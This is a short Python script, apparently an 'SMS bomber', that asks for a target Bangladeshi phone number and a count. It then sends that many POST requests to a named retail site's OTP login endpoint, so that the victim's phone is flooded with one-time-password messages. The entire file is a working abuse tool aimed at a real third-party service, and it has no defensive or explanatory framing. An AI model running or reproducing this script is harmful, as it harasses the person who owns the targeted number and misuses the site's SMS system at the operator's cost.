import requests
from requests.structures import CaseInsensitiveDict

number = str(input("ENTER TARGET NUMBER:+880"))

amount = int(input("Enter Amount: "))

url = "https://kingsbd.com/myaccount/login_otp"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "mobile="+number+"&full_phone=%252B880"+number+"&country_code=880"

for i in range(amount):
	resp = requests.post(url, headers=headers, data=data)
	print(resp.status_code)

